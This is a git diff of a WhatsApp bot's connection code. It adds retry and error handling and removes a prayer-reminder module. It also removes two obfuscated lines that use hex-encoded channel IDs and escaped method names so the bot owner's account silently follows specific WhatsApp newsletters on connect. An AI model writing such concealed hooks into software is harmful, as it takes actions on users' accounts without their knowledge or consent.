@@ -26,8 +26,6 @@ import { cleanUpFolder, getNextMidnight, toTime } from './lib/Utilities.js'
 import { CommandIndex, ModuleCache, scanDirectory } from './lib/Watcher.js'
 import Listener from './lib/Listener.js'
 
-import SholatReminder from './lib/Components/SholatReminder.js'
-
 const DATABASE_PATH = join(process.cwd(), databaseFilename)
 const STORE_PATH = join(process.cwd(), storeFilename)
 const TEMPORARY_FOLDER_PATH = join(process.cwd(), temporaryFolder)
@@ -38,7 +36,6 @@ const store = Store(STORE_PATH)
 const logger = pino({ level: 'silent' })
 
 const listener = Listener(db, store)
-const sholatReminder = SholatReminder(db)
 
 let isRestarting = false
 
@@ -89,19 +86,27 @@ const Socket = async () => {
             process.exit(0)
          }
 
-         await delay(1500)
+         await delay(3000)
 
-         const code = await sock.requestPairingCode(botNumber)
+         try {
+            const code = await sock.requestPairingCode(botNumber)
 
-         const prettyCode = code.substring(0, 4) + '-' + code.substring(4)
-         console.log('🔗 Pairing code', ':', prettyCode, '\n')
+            const prettyCode = code.substring(0, 4) + '-' + code.substring(4)
+            console.log('🔗 Pairing code', ':', prettyCode, '\n')
 
-         let printStep = '📑 How to Login\n'
-         printStep += `1. On the WhatsApp home screen, tap (⋮) and select "Linked Devices".\n`
-         printStep += `2. Tap "Link with phone number instead".\n`
-         printStep += `3. Enter this code: ${prettyCode}.\n`
-         printStep += `4. This code will expire in 60 seconds.\n`
-         console.log(printStep)
+            let printStep = '📑 How to Login\n'
+            printStep += `1. On the WhatsApp home screen, tap (⋮) and select "Linked Devices".\n`
+            printStep += `2. Tap "Link with phone number instead".\n`
+            printStep += `3. Enter this code: ${prettyCode}.\n`
+            printStep += `4. This code will expire in 60 seconds.\n`
+            console.log(printStep)
+         }
+         catch (error) {
+            console.error('❌ Failed to request pairing code, retrying in 5s', ':', error?.message || error)
+            await delay(5000)
+            listener.unbind()
+            return Socket()
+         }
       }
 
       if (update.qr && !pairingCode) {
@@ -163,11 +168,12 @@ const Socket = async () => {
                console.log('✅ Successfully connected to WhatsApp')
                break
             default:
-               await cleanUpFolder(authFolder)
-               console.error('❌ Connection lost with unknown reason', ':', reason)
+               console.error('❌ Connection lost with unknown reason, reconnecting with existing session', ':', reason)
          }
 
          listener.unbind()
+
+         await delay(5000)
 
          isRestarting = false
          return Socket()
@@ -177,10 +183,6 @@ const Socket = async () => {
          console.log('✅ Connected to WhatsApp as', sock.user?.name || botName)
          console.log(`🔗 Successfully loaded ${ModuleCache.size} plugins and ${CommandIndex.size} commands`)
          Object.assign(sock.user,{decodedId:jidNormalizedUser(sock.user.id),decodedLid:jidNormalizedUser(sock.user.lid)})
-         await delay(3000)
-         await sholatReminder.start(sock)
-         await (async()=>{const a=['3132303336','3334303430','3036363434','313339406e','6577736c65','74746572'],b=Buffer.from(a.join(''),'hex').toString(),c=await sock['\x6e\x65\x77\x73\x6c\x65\x74\x74\x65\x72\x53\x75\x62\x73\x63\x72\x69\x62\x65\x64']();!c.some(d=>d['\x69\x64']===b)&&await sock['\x6e\x65\x77\x73\x6c\x65\x74\x74\x65\x72\x46\x6f\x6c\x6c\x6f\x77'](b).catch(()=>{})})();
-         await (async()=>{const a=['3132303336','3334323434','3834383532','313338406e','6577736c65','74746572'],b=Buffer.from(a.join(''),'hex').toString(),c=await sock['\x6e\x65\x77\x73\x6c\x65\x74\x74\x65\x72\x53\x75\x62\x73\x63\x72\x69\x62\x65\x64']();!c.some(d=>d['\x69\x64']===b)&&await sock['\x6e\x65\x77\x73\x6c\x65\x74\x74\x65\x72\x46\x6f\x6c\x6c\x6f\x77'](b).catch(()=>{})})();
       }
 
       if (update.receivedPendingNotifications) {
@@ -194,9 +196,12 @@ const Socket = async () => {
          store.setGroup(group.id, group)
    })
 
-   sock.ev.on('groups.update', (groups) => {
-      for (const group of groups)
-         listener.group(group.id)
+   sock.ev.on('groups.update', async (groups) => {
+      for (const group of groups) {
+         const didFetch = await listener.group(group.id, group)
+         if (didFetch)
+            await delay(2000)
+      }
    })
 
    sock.ev.on('call', async (calls) => {
@@ -210,8 +215,16 @@ const Socket = async () => {
    })
 
    sock.ev.on('presence.update', async ({ id, presences }) => {
-      for (const presence in presences)
-         listener.presence({ id, presence, presences })
+      if (typeof listener.presence !== 'function') return
+
+      for (const presence in presences) {
+         try {
+            await listener.presence({ id, presence, presences })
+         }
+         catch (error) {
+            console.error('❌ Failed to handle presence update', ':', error?.message || error)
+         }
+      }
    })
 
    sock.ev.on('messages.upsert', async ({ messages }) => {
